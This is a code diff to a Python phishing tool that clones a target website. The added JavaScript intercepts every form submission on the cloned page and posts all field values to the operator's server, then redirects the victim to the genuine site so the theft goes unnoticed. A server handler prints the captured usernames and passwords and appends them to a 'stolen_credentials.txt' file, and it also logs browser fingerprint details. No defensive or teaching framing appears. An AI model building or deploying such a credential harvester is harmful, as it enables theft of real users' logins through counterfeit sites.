@@ -67,6 +67,33 @@ def save_cloned_html(url, html_content, folder):
     '''
     soup.head.append(script_tag)
 
+    # Add script for redirection after form submission
+    redirection_script = soup.new_tag('script')
+    redirection_script.string = '''
+    document.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        var formData = new FormData(e.target);
+        var data = [];
+        
+        formData.forEach(function(value, key) {
+            console.log('Input Field - Name: ' + key + ', Value: ' + value);
+            data.push(encodeURIComponent(key) + '=' + encodeURIComponent(value));
+        });
+
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', '/submit', true);
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.send(data.join('&'));
+
+        setTimeout(function() {
+            window.location.href = '%s';
+        }, 1000); // Redirect after 1 second
+    });
+    ''' % url
+
+    soup.body.append(redirection_script)
+
     cloned_html_path = os.path.join(folder, 'index.html')
     with open(cloned_html_path, 'w', encoding='utf-8') as f:
         f.write(soup.prettify())
@@ -90,17 +117,21 @@ class PhishingHandler(BaseHTTPRequestHandler):
             content_length = int(self.headers['Content-Length'])
             post_data = self.rfile.read(content_length).decode('utf-8')
             parsed_data = parse_qs(post_data)
+            print(Fore.GREEN + "[+] Received form data:")
+            for key, values in parsed_data.items():
+                for value in values:
+                    print(Fore.YELLOW + f"   {key}: {value}")
+
+            # Log credentials and other data
             username = parsed_data.get('username', [''])[0]
             password = parsed_data.get('password', [''])[0]
-            client_ip = self.client_address[0]  # Capture the client IP address
-            
-            print(Fore.GREEN + "[+] Received credentials:")
-            print(Fore.YELLOW + f"   Username: {username}")
-            print(Fore.YELLOW + f"   Password: {password}")
-            print(Fore.YELLOW + f"   IP Address: {client_ip}")
+            if username or password:
+                print(Fore.GREEN + "[+] Received credentials:")
+                print(Fore.YELLOW + f"   Username: {username}")
+                print(Fore.YELLOW + f"   Password: {password}")
 
-            with open("stolen_credentials.txt", "a") as f:
-                f.write(f"Username: {username}\nPassword: {password}\nIP Address: {client_ip}\n")
+                with open("stolen_credentials.txt", "a") as f:
+                    f.write(f"Username: {username}\nPassword: {password}\n")
 
             self.send_response(200)
             self.send_header("Content-type", "text/html")
@@ -115,17 +146,15 @@ class PhishingHandler(BaseHTTPRequestHandler):
             screen_resolution = parsed_info.get('Screen Resolution', [''])[0]
             timezone = parsed_info.get('Timezone', [''])[0]
             language = parsed_info.get('Language', [''])[0]
-            client_ip = self.client_address[0]  # Capture the client IP address
 
             print(Fore.BLUE + "[+] Received system info:")
             print(Fore.CYAN + f"   User-Agent: {user_agent}")
             print(Fore.CYAN + f"   Screen Resolution: {screen_resolution}")
             print(Fore.CYAN + f"   Timezone: {timezone}")
             print(Fore.CYAN + f"   Language: {language}")
-            print(Fore.CYAN + f"   IP Address: {client_ip}")
 
             with open("system_info.txt", "a") as f:
-                f.write(f"User-Agent: {user_agent}\nScreen Resolution: {screen_resolution}\nTimezone: {timezone}\nLanguage: {language}\nIP Address: {client_ip}\n")
+                f.write(f"User-Agent: {user_agent}\nScreen Resolution: {screen_resolution}\nTimezone: {timezone}\nLanguage: {language}\n")
 
             self.send_response(200)
             self.send_header("Content-type", "text/plain")
